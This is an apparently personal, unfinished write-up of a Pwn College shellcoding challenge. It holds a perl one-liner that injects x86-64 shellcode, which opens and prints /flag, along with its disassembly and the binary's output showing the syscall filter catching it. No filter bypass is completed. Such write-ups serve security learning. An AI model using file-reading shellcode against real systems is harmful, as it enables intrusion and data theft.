---
Platform: Pwn College
Tittle: Syscall Smuggler
Date & Tme: 2026 - 10 - 22 20:09
tags:
  - Challenge
  - BinaryExploitation
  - ShellcodeInjection
---
---
## FLAG : `{}`

---
## Solution :
The hint : 
>Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

We couln't use any syscall, sysenter, and even int instruction. 

Let's give it a try on `read /flag` shellcode : 
```shell
hacker@program-security~syscall-smuggler:/challenge$ perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x90\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x54\x5e\x90\x90\x90\x97\x90\x31\xd2\x66\xba\xef\x0f\x90\x31\xc0\x0f\x05\x6a\x01\x5f\x90\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00"' | ./syscall-smuggler
###
### Welcome to ./syscall-smuggler!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

Mapped 0x1000 bytes for shellcode at 0x1b895000!
Reading 0x1000 bytes from stdin.

Executing filter...

This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
insert the `syscall` instructions at runtime.

Failed filter at byte 9!
```

Let's breakdown our shellcode : 
```shell
0000000000400080 <.text>:
  400080: eb 2f                 jmp    0x4000b1
  400082: 5f                    pop    rdi
  400083: 6a 02                 push   0x2
  400085: 58                    pop    rax
  400086: 48 31 f6              xor    rsi,rsi  
  400089: 0f 05                 syscall #not allowed
  40008b: 66 81 ec ef 0f        sub    sp,0xfef
  400090: 48 8d 34 24           lea    rsi,[rsp]  
  400094: 48 97                 xchg   rdi,rax  
  400096: 48 31 d2              xor    rdx,rdx  
  400099: 66 ba ef 0f           mov    dx,0xfef
  40009d: 48 31 c0              xor    rax,rax  
  4000a0: 0f 05                 syscall #not allowed
  4000a2: 6a 01                 push   0x1
  4000a4: 5f                    pop    rdi
  4000a5: 48 92                 xchg   rdx,rax  
  4000a7: 6a 01                 push   0x1
  4000a9: 58                    pop    rax
  4000aa: 0f 05                 syscall #not allowed
  4000ac: 6a 3c                 push   0x3c
  4000ae: 58                    pop    rax
  4000af: 0f 05                 syscall  #not allowed
  4000b1: e8 cc ff ff ff        call   0x400082
```


---
### Key Takeaways : 



---
## Related Concepts : 
[[]]

